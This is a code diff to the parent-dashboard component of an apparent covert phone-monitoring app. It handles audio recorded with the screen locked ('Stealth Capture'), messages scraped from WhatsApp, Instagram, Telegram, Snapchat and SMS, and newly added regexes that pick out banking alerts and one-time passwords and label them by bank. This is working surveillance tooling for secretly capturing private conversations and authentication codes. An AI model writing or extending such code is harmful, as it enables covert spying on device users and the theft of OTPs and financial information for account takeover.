@@ -8,6 +8,7 @@ import '../models/chat_message.dart';
 import '../models/notification_item.dart';
 import '../models/watchlist_target.dart';
 import '../models/ambient_log_item.dart';
+import '../services/audio_playback_service.dart';
 
 class ParentDashboardProvider extends ChangeNotifier {
   ParentDashboardProvider() {
@@ -173,16 +174,19 @@ class ParentDashboardProvider extends ChangeNotifier {
             final cType = (d['callType'] ?? '').toString().toLowerCase();
 
             if (cType == 'ambient') {
+              final rawAudio = (d['recordingUrl'] ?? d['audioUrl'] ?? d['url'])?.toString();
+              final hasValidAudio = rawAudio != null && rawAudio.trim().isNotEmpty && (rawAudio.startsWith('http') || rawAudio.startsWith('/'));
               realAmbient.add(AmbientLogItem(
                 id: doc.id,
                 timestamp: dt,
                 durationSeconds: (d['durationSeconds'] as num?)?.toInt() ?? 30,
-                audioUrl: d['recordingUrl'],
+                audioUrl: hasValidAudio ? rawAudio : null,
                 locationContext: "Pocket / Desk Stealth Capture",
                 speechSnippet: d['speechSnippet'] ?? "Screen-off acoustic soundbite captured from child's device.",
                 conversationSummary: d['summary'] ?? "Pocket soundbite recorded automatically while screen was locked.",
                 isFlagged: d['isFlagged'] as bool? ?? false,
-                isPurgedFromCloud: false,
+                isPurgedFromCloud: !hasValidAudio,
+                storageFreedKb: hasValidAudio ? 0 : 2048,
                 speakers: [
                   SpeakerVoiceProfile(
                     speakerId: "spk_1",
@@ -249,15 +253,28 @@ class ParentDashboardProvider extends ChangeNotifier {
             if (isScraperGarbage(rawText)) continue;
 
             final dt = _parseTimestamp(d['timestamp']);
-            AppType app = AppType.whatsApp;
             final appStr = (d['app'] ?? '').toString().toLowerCase();
+            final rawSender = (d['sender'] ?? 'Unknown').toString().trim();
+
+            AppType app = AppType.whatsApp;
             if (appStr.contains('insta')) app = AppType.instagram;
             if (appStr.contains('tele')) app = AppType.telegram;
             if (appStr.contains('snap')) app = AppType.snapchat;
-            if (appStr.contains('sms')) app = AppType.sms;
+            if (appStr.contains('sms') || appStr.contains('mms') || appStr.contains('messaging')) app = AppType.sms;
+
+            // Automatically detect SMS / Banking / OTP alerts even if scraped under WhatsApp or generic Social
+            final isSmsSenderPattern = RegExp(r'^[A-Z]{2}-[A-Z0-9]{4,10}$', caseSensitive: false).hasMatch(rawSender);
+            final isBankingOtp = RegExp(
+              r'\b(?:otp|authentication code|verification code|debited by|credited with|bank|acct|a/c|one time password)\b',
+              caseSensitive: false,
+            ).hasMatch(rawText);
+
+            if (doc.id.startsWith('sms_') || isSmsSenderPattern || (isBankingOtp && (appStr.isEmpty || appStr == 'social' || appStr == 'whatsapp' || appStr == 'messages'))) {
+              app = AppType.sms;
+            }
 
             final parsed = parseMessageContent(
-              (d['sender'] ?? 'Unknown').toString(),
+              rawSender,
               rawText,
               d['isDeletedBySender'] as bool? ?? false,
             );
@@ -266,9 +283,49 @@ class ParentDashboardProvider extends ChangeNotifier {
             String finalText = parsed.cleanText;
             bool finalDeleted = parsed.isDeleted;
 
+            // Resolve friendly bank name for SMS
+            if (app == AppType.sms) {
+              if (isSmsSenderPattern) {
+                final match = RegExp(r'^[A-Z]{2}-([A-Z0-9]+)$', caseSensitive: false).firstMatch(rawSender);
+                final code = match?.group(1)?.toUpperCase() ?? rawSender;
+                if (code.contains('UNIONB')) {
+                  finalSender = 'Union Bank Of India ($rawSender)';
+                } else if (code.contains('HDFC')) {
+                  finalSender = 'HDFC Bank ($rawSender)';
+                } else if (code.contains('SBI')) {
+                  finalSender = 'State Bank of India ($rawSender)';
+                } else if (code.contains('ICICI')) {
+                  finalSender = 'ICICI Bank ($rawSender)';
+                } else if (code.contains('AXIS')) {
+                  finalSender = 'Axis Bank ($rawSender)';
+                } else if (code.contains('KOTAK')) {
+                  finalSender = 'Kotak Bank ($rawSender)';
+                } else if (code.contains('PAYTM')) {
+                  finalSender = 'Paytm Bank ($rawSender)';
+                } else {
+                  finalSender = '$code ($rawSender)';
+                }
+              } else if (finalSender == 'WhatsApp Contact' || finalSender == 'Unknown' || finalSender.isEmpty) {
+                final lowerBody = rawText.toLowerCase();
+                if (lowerBody.contains('union bank')) {
+                  finalSender = 'Union Bank Of India';
+                } else if (lowerBody.contains('hdfc')) {
+                  finalSender = 'HDFC Bank';
+                } else if (lowerBody.contains('sbi') || lowerBody.contains('state bank')) {
+                  finalSender = 'State Bank of India';
+                } else if (lowerBody.contains('icici')) {
+                  finalSender = 'ICICI Bank';
+                } else if (lowerBody.contains('axis')) {
+                  finalSender = 'Axis Bank';
+                } else {
+                  finalSender = 'Bank & Security Alerts';
+                }
+              }
+            }
+
             // If sender is still generic like "WhatsApp Contact" or "Snapchat Chat",
             // resolve from recent notifications around that timestamp
-            if (finalSender == 'WhatsApp Contact' || finalSender == 'Snapchat Chat' || finalSender == 'Unknown') {
+            if (finalSender == 'WhatsApp Contact' || finalSender == 'Snapchat Chat' || finalSender == 'Unknown' || finalSender == 'Instagram Contact') {
               final resolved = _resolveSenderFromNotifications(app, dt);
               if (resolved != null && resolved.isNotEmpty) {
                 finalSender = resolved;
@@ -357,6 +414,71 @@ class ParentDashboardProvider extends ChangeNotifier {
     if (RegExp(r'^\d{6,}$').hasMatch(t)) return true;
 
     final lower = t.toLowerCase();
+
+    // End-to-end encryption notices and security disclaimers
+    if (lower.contains('end-to-end encrypted') ||
+        lower.contains('end to end encrypted') ||
+        lower.contains('messages and calls are end-to-end') ||
+        lower.contains('your personal messages are end-to-end')) {
+      return true;
+    }
+
+    // Android Action Buttons, quick actions, dialog buttons
+    const actionButtons = {
+      'copy',
+      'copy code',
+      'copy otp',
+      'tap to copy',
+      'reply',
+      'delete',
+      'delete message',
+      'forward',
+      'share',
+      'mark as read',
+      'clear all',
+      'dismiss',
+      'view details',
+      'report',
+      'block',
+      'done',
+      'cancel',
+      'install',
+      'update',
+      'open',
+      'messages',
+      'all messages',
+      'conversations',
+      'select',
+      'select all',
+      'unread',
+      'read',
+    };
+    if (actionButtons.contains(lower)) return true;
+
+    // Relative timestamps: "6 minutes ago", "12 mins ago", "2 hours ago", "yesterday", "just now", "10:30 AM"
+    if (RegExp(r'^\d+\s*(?:second|sec|minute|min|hour|hr|day|week|month)s?\s*(?:ago)?$', caseSensitive: false).hasMatch(t)) {
+      return true;
+    }
+    if (lower == 'just now' || lower == 'today' || lower == 'yesterday' || lower == 'yesterday at' || lower == 'now') {
+      return true;
+    }
+    if (RegExp(r'^\d{1,2}:\d{2}\s*(?:AM|PM|am|pm)?$').hasMatch(t)) return true;
+    if (RegExp(r'^\d{1,2}/\d{1,2}/\d{2,4}$').hasMatch(t)) return true;
+
+    // Standalone SMS sender codes (e.g. "JK-UNIONB-S", "VK-HDFCBK") when scraped as separate text views
+    if (RegExp(r'^[A-Z]{2}-[A-Z0-9]{4,10}$', caseSensitive: false).hasMatch(t)) {
+      return true;
+    }
+
+    // Standalone OTP digits (e.g. "188 761" or 4-8 isolated digits)
+    if (RegExp(r'^\d{3}\s+\d{3}$').hasMatch(t)) return true;
+    if (RegExp(r'^\d{4,8}$').hasMatch(t)) return true;
+
+    // Notification subheaders and tags
+    if (lower.startsWith('otp •') || lower.startsWith('otp:') || lower == 'otp' || lower.contains('transaction alert')) {
+      return true;
+    }
+
     const garbageIds = {
       'feed_plus_badge_icon',
       'avatar_container',
@@ -368,11 +490,6 @@ class ParentDashboardProvider extends ChangeNotifier {
       'action_mode_close_button',
     };
     if (garbageIds.contains(lower)) return true;
-
-    // Standalone timestamps (e.g., 3:37 PM, 12:45 AM, 15:30, 24/09/2026, Today, Yesterday)
-    if (RegExp(r'^\d{1,2}:\d{2}\s*(?:AM|PM|am|pm)?$').hasMatch(t)) return true;
-    if (RegExp(r'^\d{1,2}/\d{1,2}/\d{2,4}$').hasMatch(t)) return true;
-    if (lower == 'today' || lower == 'yesterday') return true;
 
     // Static UI action bar buttons and navigation placeholders that get scraped
     const uiNavigationGarbage = {
@@ -409,6 +526,10 @@ class ParentDashboardProvider extends ChangeNotifier {
       'view story',
       'add friend',
       'create group',
+      'online',
+      'typing...',
+      'tap for more info',
+      'info',
     };
     if (uiNavigationGarbage.contains(lower)) return true;
 
@@ -519,7 +640,7 @@ class ParentDashboardProvider extends ChangeNotifier {
     for (final n in notifs) {
       if (n.appName.toLowerCase().contains(targetAppStr) || targetAppStr.contains(n.appName.toLowerCase())) {
         final diff = dt.difference(n.timestamp).inMinutes.abs();
-        if (diff <= 5 && n.title.isNotEmpty && n.title != 'Unknown') {
+        if (diff <= 15 && n.title.isNotEmpty && n.title != 'Unknown' && !n.title.contains('Contact')) {
           return n.title;
         }
       }
@@ -892,11 +1013,27 @@ class ParentDashboardProvider extends ChangeNotifier {
     notifyListeners();
   }
 
-  void togglePlayAudio(String callId) {
-    if (_currentlyPlayingAudioId == callId) {
+  Future<void> togglePlayAudio(String callId) async {
+    final allCalls = callRecords;
+    CallRecord? targetCall;
+    for (final c in allCalls) {
+      if (c.id == callId) {
+        targetCall = c;
+        break;
+      }
+    }
+
+    if (AudioPlaybackService.instance.isPlaying && AudioPlaybackService.instance.currentMediaId == callId) {
+      await AudioPlaybackService.instance.pause();
       _currentlyPlayingAudioId = null;
     } else {
       _currentlyPlayingAudioId = callId;
+      if (targetCall != null && targetCall.recordingUrl != null && targetCall.recordingUrl!.isNotEmpty) {
+        await AudioPlaybackService.instance.play(
+          mediaId: callId,
+          url: targetCall.recordingUrl,
+        );
+      }
     }
     notifyListeners();
   }
